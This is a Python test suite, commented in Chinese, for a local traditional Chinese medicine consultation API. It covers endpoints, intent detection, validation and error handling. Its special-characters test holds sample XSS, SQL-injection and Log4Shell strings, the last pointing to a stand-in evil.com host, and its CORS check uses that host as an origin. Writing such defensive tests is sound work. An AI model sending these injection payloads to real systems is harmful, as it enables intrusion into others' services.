"""
中医多智能体问诊系统 - 全面测试
"""
import json
import time
import requests
import sys

BASE_URL = "http://127.0.0.1:8000"
results = []

def log(severity, category, title, detail="", reproduce="", suggestion=""):
    results.append({
        "severity": severity,
        "category": category,
        "title": title,
        "detail": detail,
        "reproduce": reproduce,
        "suggestion": suggestion,
    })
    icon = {"致命": "🔴", "严重": "🟠", "一般": "🟡", "轻微": "🔵", "通过": "✅"}
    print(f"  {icon.get(severity, '❓')} [{severity}] {title}")
    if detail:
        print(f"    详情: {detail[:200]}")

def api_call(method, path, json_data=None, timeout=120, **kwargs):
    url = f"{BASE_URL}{path}"
    try:
        start = time.time()
        resp = requests.request(method, url, json=json_data, timeout=timeout, **kwargs)
        elapsed = time.time() - start
        return resp, elapsed
    except requests.exceptions.Timeout:
        return None, -1
    except requests.exceptions.ConnectionError:
        return None, -2
    except Exception as e:
        return None, str(e)

# ==================== 1. API接口测试 ====================
print("\n" + "="*60)
print("1. API接口测试")
print("="*60)

# 1.1 健康检查
print("\n--- 1.1 GET / 健康检查 ---")
resp, elapsed = api_call("GET", "/")
if resp and resp.status_code == 200:
    data = resp.json()
    if data.get("status") == "healthy":
        log("通过", "API", "健康检查接口正常", f"响应: {data}")
    else:
        log("一般", "API", "健康检查状态异常", f"status={data.get('status')}")
else:
    log("致命", "API", "健康检查接口不可用", f"resp={resp}, elapsed={elapsed}")

# 1.2 /health
print("\n--- 1.2 GET /health ---")
resp, elapsed = api_call("GET", "/health")
if resp and resp.status_code == 200:
    log("通过", "API", "/health 接口正常")
else:
    log("严重", "API", "/health 接口不可用", f"status={resp.status_code if resp else 'N/A'}")

# 1.3 Swagger 文档
print("\n--- 1.3 GET /docs ---")
resp, elapsed = api_call("GET", "/docs")
if resp and resp.status_code == 200 and "swagger" in resp.text.lower():
    log("通过", "API", "Swagger 文档可访问")
else:
    log("一般", "API", "Swagger 文档访问异常", f"status={resp.status_code if resp else 'N/A'}")

# 1.4 OpenAPI JSON
print("\n--- 1.4 GET /openapi.json ---")
resp, elapsed = api_call("GET", "/openapi.json")
if resp and resp.status_code == 200:
    data = resp.json()
    paths = list(data.get("paths", {}).keys())
    log("通过", "API", "OpenAPI JSON 可访问", f"路径: {paths}")
else:
    log("一般", "API", "OpenAPI JSON 不可访问")

# 1.5 问诊接口 - 正常请求 (stream=false)
print("\n--- 1.5 POST /api/v1/chat/generate (非流式) ---")
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
    "message": "我最近胃痛，吃东西后胀痛",
    "stream": False
}, timeout=120)
if resp and resp.status_code == 200:
    data = resp.json()
    answer = data.get("answer", "")
    intent = data.get("intent", "")
    conversation_id = data.get("conversation_id", "")
    print(f"    耗时: {elapsed:.1f}s, 意图: {intent}, 回答长度: {len(answer)}")
    if answer:
        log("通过", "功能", "胃痛问诊 - 非流式正常", f"intent={intent}, answer_len={len(answer)}")
    else:
        log("严重", "功能", "胃痛问诊 - 回答为空", f"data={data}")
    if not conversation_id:
        log("一般", "功能", "缺少 conversation_id")
elif resp:
    log("严重", "API", "问诊接口返回错误", f"status={resp.status_code}, body={resp.text[:300]}")
else:
    log("致命", "API", "问诊接口不可用", f"elapsed={elapsed}")

# 1.6 问诊接口 - 流式请求
print("\n--- 1.6 POST /api/v1/chat/generate (流式) ---")
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
    "message": "我失眠多梦",
    "stream": True
}, timeout=120)
if resp and resp.status_code == 200:
    content_type = resp.headers.get("content-type", "")
    body = resp.text
    if "text/event-stream" in content_type:
        # 解析 SSE 事件
        events = []
        for line in body.split("\n"):
            if line.startswith("event:"):
                events.append(line.strip())
        log("通过", "API", "流式输出格式正确", f"事件: {events}")
        
        # 检查是否有 error 事件
        if "event: error" in body:
            # 提取错误内容
            for line in body.split("\n"):
                if line.startswith("data:") and "error" in line.lower():
                    log("严重", "功能", "流式输出包含错误事件", f"{line[:200]}")
                    break
        if "event: done" in body:
            log("通过", "API", "流式输出正常结束")
        else:
            log("一般", "API", "流式输出缺少 done 事件", f"最后事件: {events[-1] if events else 'none'}")
    else:
        log("一般", "API", "流式输出 Content-Type 不正确", f"content-type={content_type}")
elif resp:
    log("严重", "API", "流式接口返回错误", f"status={resp.status_code}")
else:
    log("致命", "API", "流式接口不可用")

# ==================== 2. 功能测试 ====================
print("\n" + "="*60)
print("2. 功能测试")
print("="*60)

# 2.1 多种症状问诊
symptoms = [
    ("胃痛", "我最近胃痛，吃东西后胀痛，有时候反酸"),
    ("失眠", "我最近失眠很严重，晚上翻来覆去睡不着"),
    ("咳嗽", "我咳嗽有痰，已经咳了一个星期了"),
]

for name, msg in symptoms:
    print(f"\n--- 2.{symptoms.index((name, msg))+1} 问诊: {name} ---")
    resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
        "message": msg, "stream": False
    }, timeout=120)
    if resp and resp.status_code == 200:
        data = resp.json()
        answer = data.get("answer", "")
        intent = data.get("intent", "")
        steps = data.get("steps", [])
        print(f"    耗时: {elapsed:.1f}s, 意图: {intent}, 步骤数: {len(steps)}")
        
        # 检查知识图谱是否返回
        if "知识图谱参考" in answer:
            log("通过", "功能", f"{name}问诊 - 知识图谱数据已返回")
        else:
            log("一般", "功能", f"{name}问诊 - 未返回知识图谱数据", f"answer前200字: {answer[:200]}")
        
        # 检查回答是否包含基本诊断信息
        if len(answer) > 100:
            log("通过", "功能", f"{name}问诊 - 回答内容充实", f"长度: {len(answer)}")
        else:
            log("一般", "功能", f"{name}问诊 - 回答过短", f"长度: {len(answer)}, 内容: {answer}")
        
        # 检查 steps
        if steps:
            log("通过", "功能", f"{name}问诊 - 步骤记录正常", f"steps={steps}")
        else:
            log("一般", "功能", f"{name}问诊 - 缺少步骤记录")
    else:
        log("严重", "功能", f"{name}问诊失败", f"resp={resp}")

# 2.2 不同意图的输入
print("\n--- 2.4 意图识别: 闲聊 ---")
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
    "message": "你好，今天天气怎么样", "stream": False
}, timeout=60)
if resp and resp.status_code == 200:
    data = resp.json()
    intent = data.get("intent", "")
    answer = data.get("answer", "")
    print(f"    耗时: {elapsed:.1f}s, 意图: {intent}")
    if intent in ("general", "wellness"):
        log("通过", "功能", "闲聊意图识别正确", f"intent={intent}")
    elif intent:
        log("一般", "功能", f"闲聊意图识别偏差", f"expected=general, got={intent}")
    if answer:
        log("通过", "功能", "闲聊有回答")
    else:
        log("严重", "功能", "闲聊无回答")
else:
    log("严重", "功能", "闲聊请求失败")

print("\n--- 2.5 意图识别: 药材查询 ---")
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
    "message": "黄芪有什么功效", "stream": False
}, timeout=60)
if resp and resp.status_code == 200:
    data = resp.json()
    intent = data.get("intent", "")
    answer = data.get("answer", "")
    print(f"    耗时: {elapsed:.1f}s, 意图: {intent}")
    if intent == "herb":
        log("通过", "功能", "药材查询意图识别正确")
    else:
        log("一般", "功能", f"药材查询意图识别偏差", f"expected=herb, got={intent}")
else:
    log("严重", "功能", "药材查询请求失败")

print("\n--- 2.6 意图识别: 方剂查询 ---")
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
    "message": "六味地黄丸的组成是什么", "stream": False
}, timeout=60)
if resp and resp.status_code == 200:
    data = resp.json()
    intent = data.get("intent", "")
    answer = data.get("answer", "")
    print(f"    耗时: {elapsed:.1f}s, 意图: {intent}")
    if intent == "prescription":
        log("通过", "功能", "方剂查询意图识别正确")
    else:
        log("一般", "功能", f"方剂查询意图识别偏差", f"expected=prescription, got={intent}")
else:
    log("严重", "功能", "方剂查询请求失败")

# ==================== 3. 异常测试 ====================
print("\n" + "="*60)
print("3. 异常测试")
print("="*60)

# 3.1 空输入
print("\n--- 3.1 空输入 ---")
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
    "message": "", "stream": False
}, timeout=30)
if resp:
    if resp.status_code == 422:
        log("通过", "异常", "空输入正确返回422验证错误")
    elif resp.status_code == 200:
        log("一般", "异常", "空输入未被拦截，返回了200", "应该返回422验证错误")
    else:
        log("一般", "异常", f"空输入返回非常规状态码", f"status={resp.status_code}")
else:
    log("一般", "异常", "空输入请求异常")

# 3.2 超长输入
print("\n--- 3.2 超长输入 ---")
long_msg = "我胃痛" * 1000  # 3000字符
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
    "message": long_msg, "stream": False
}, timeout=30)
if resp:
    if resp.status_code == 422:
        log("通过", "异常", "超长输入正确返回422验证错误")
    elif resp.status_code == 200:
        data = resp.json()
        log("一般", "异常", "超长输入未被拦截", f"返回了200, answer长度={len(data.get('answer',''))}")
    else:
        log("一般", "异常", f"超长输入返回非常规状态码", f"status={resp.status_code}")
else:
    log("一般", "异常", "超长输入请求超时或异常")

# 3.3 边界长度输入 (max_length=2000)
print("\n--- 3.3 边界长度输入 (2000字符) ---")
boundary_msg = "胃痛" * 500  # exactly 2000 chars
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
    "message": boundary_msg, "stream": False
}, timeout=120)
if resp and resp.status_code == 200:
    log("通过", "异常", "2000字符输入被接受")
elif resp and resp.status_code == 422:
    log("通过", "异常", "2000字符输入被验证拒绝")
elif resp:
    log("一般", "异常", f"2000字符输入返回意外状态码", f"status={resp.status_code}")

# 3.4 特殊字符输入
print("\n--- 3.4 特殊字符输入 ---")
special_chars = [
    ("<script>alert(1)</script>", "XSS注入"),
    ("'; DROP TABLE users; --", "SQL注入"),
    ("${jndi:ldap://evil.com}", "Log4Shell注入"),
    ("我胃痛\n\r\t\b\\n\\r", "控制字符"),
    ("我胃痛💊🌡️👨‍⚕️", "Emoji字符"),
    ("我胃痛。！？【】（）", "中文标点"),
]
for payload, desc in special_chars:
    resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
        "message": payload, "stream": False
    }, timeout=60)
    if resp and resp.status_code == 200:
        data = resp.json()
        answer = data.get("answer", "")
        # 检查是否反射了注入内容
        if "<script>" in answer or "DROP TABLE" in answer:
            log("严重", "安全", f"{desc} - 注入内容被反射", f"answer包含注入内容")
        else:
            log("通过", "异常", f"{desc} - 安全处理")
    elif resp and resp.status_code == 422:
        log("通过", "异常", f"{desc} - 被验证拒绝")
    elif resp:
        log("一般", "异常", f"{desc} - 状态码{resp.status_code}", resp.text[:200])
    else:
        log("一般", "异常", f"{desc} - 请求失败")

# 3.5 无意义输入
print("\n--- 3.5 无意义输入 ---")
nonsense = ["asdfghjkl", "123456789", "啊啊啊啊啊啊", "！@#￥%……&*"]
for msg in nonsense:
    resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
        "message": msg, "stream": False
    }, timeout=60)
    if resp and resp.status_code == 200:
        data = resp.json()
        answer = data.get("answer", "")
        if answer and len(answer) > 10:
            log("通过", "异常", f"无意义输入 '{msg}' 有合理回答")
        else:
            log("一般", "异常", f"无意义输入 '{msg}' 回答过短或为空")
    else:
        log("一般", "异常", f"无意义输入 '{msg}' 请求失败")

# ==================== 4. 错误处理检查 ====================
print("\n" + "="*60)
print("4. 错误处理检查")
print("="*60)

# 4.1 缺少必填字段
print("\n--- 4.1 缺少必填字段 ---")
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {}, timeout=10)
if resp and resp.status_code == 422:
    data = resp.json()
    log("通过", "错误处理", "缺少message字段返回422", f"detail={data.get('detail','')[:200]}")
else:
    log("一般", "错误处理", f"缺少message字段返回: {resp.status_code if resp else 'N/A'}")

# 4.2 错误类型字段
print("\n--- 4.2 错误类型字段 ---")
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {
    "message": 12345, "stream": False
}, timeout=10)
if resp and resp.status_code == 422:
    log("通过", "错误处理", "message类型错误返回422")
elif resp and resp.status_code == 200:
    log("一般", "错误处理", "message为数字时未被拦截")
else:
    log("一般", "错误处理", f"message类型错误返回: {resp.status_code if resp else 'N/A'}")

# 4.3 不存在的路径
print("\n--- 4.3 不存在的路径 ---")
resp, elapsed = api_call("GET", "/api/v1/nonexistent", timeout=10)
if resp and resp.status_code == 404:
    log("通过", "错误处理", "不存在路径返回404")
else:
    log("一般", "错误处理", f"不存在路径返回: {resp.status_code if resp else 'N/A'}")

# 4.4 错误的HTTP方法
print("\n--- 4.4 错误的HTTP方法 ---")
resp, elapsed = api_call("GET", "/api/v1/chat/generate", timeout=10)
if resp and resp.status_code == 405:
    log("通过", "错误处理", "错误HTTP方法返回405")
else:
    log("轻微", "错误处理", f"错误HTTP方法返回: {resp.status_code if resp else 'N/A'}")

# 4.5 错误响应格式
print("\n--- 4.5 422错误响应格式 ---")
resp, elapsed = api_call("POST", "/api/v1/chat/generate", {}, timeout=10)
if resp and resp.status_code == 422:
    try:
        data = resp.json()
        if "detail" in data:
            log("通过", "错误处理", "422响应格式正确", f"包含detail字段")
        else:
            log("轻微", "错误处理", "422响应格式不标准", f"keys={list(data.keys())}")
    except:
        log("一般", "错误处理", "422响应非JSON格式")

# ==================== 5. 边界和安全性检查 ====================
print("\n" + "="*60)
print("5. 安全性和边界检查")
print("="*60)

# 5.1 CORS 检查
print("\n--- 5.1 CORS 配置 ---")
resp = requests.options(f"{BASE_URL}/api/v1/chat/generate", headers={
    "Origin": "http://evil.com",
    "Access-Control-Request-Method": "POST",
}, timeout=10)
if resp:
    acao = resp.headers.get("access-control-allow-origin", "")
    if acao == "*":
        log("一般", "安全", "CORS允许所有来源 (allow_origins=['*'])", "生产环境应限制来源")
    elif "evil.com" in acao:
        log("严重", "安全", "CORS允许恶意来源")
    else:
        log("通过", "安全", "CORS来源限制正常")

# 5.2 Pydantic min_length/max_length
print("\n--- 5.2 输入长度限制 ---")
# 测试 min_length=1 (空字符串应该被拒绝)
resp = requests.post(f"{BASE_URL}/api/v1/chat/generate", 
    json={"message": "", "stream": False}, timeout=10)
if resp and resp.status_code == 422:
    log("通过", "安全", "min_length=1 生效 - 空字符串被拒绝")
else:
    log("一般", "安全", "min_length=1 未生效", "空字符串未被Pydantic拦截")

# ==================== 6. 前端界面检查 ====================
print("\n" + "="*60)
print("6. 前端界面检查")
print("="*60)

# 检查是否有前端静态文件
import os
project_root = "E:/自用/RenShu-AI-study/my-tcm-agent"
has_frontend = False
for root, dirs, files in os.walk(project_root):
    for f in files:
        if f.endswith(('.html', '.vue', '.jsx', '.tsx', '.svelte')):
            has_frontend = True
            break
    if has_frontend:
        break

if has_frontend:
    log("通过", "前端", "检测到前端文件")
else:
    log("轻微", "前端", "未检测到前端界面文件", "项目为纯后端API服务")

# ==================== 汇总报告 ====================
print("\n" + "="*60)
print("测试汇总")
print("="*60)

severity_count = {}
for r in results:
    s = r["severity"]
    severity_count[s] = severity_count.get(s, 0) + 1

print(f"\n总测试项: {len(results)}")
for s in ["通过", "致命", "严重", "一般", "轻微"]:
    if s in severity_count:
        print(f"  {s}: {severity_count[s]}")

print("\n--- 发现的问题列表 ---")
bugs = [r for r in results if r["severity"] not in ("通过",)]
for i, bug in enumerate(bugs, 1):
    print(f"\n{i}. [{bug['severity']}] {bug['title']}")
    print(f"   分类: {bug['category']}")
    if bug['detail']:
        print(f"   详情: {bug['detail'][:300]}")
    if bug['reproduce']:
        print(f"   复现: {bug['reproduce']}")
    if bug['suggestion']:
        print(f"   建议: {bug['suggestion']}")

# 保存JSON报告
report_path = "E:/自用/RenShu-AI-study/my-tcm-agent/backend/tests/test_report.json"
with open(report_path, "w", encoding="utf-8") as f:
    json.dump({
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "total": len(results),
        "passed": severity_count.get("通过", 0),
        "bugs": len(bugs),
        "severity_summary": severity_count,
        "results": results,
    }, f, ensure_ascii=False, indent=2)
print(f"\n报告已保存到: {report_path}")
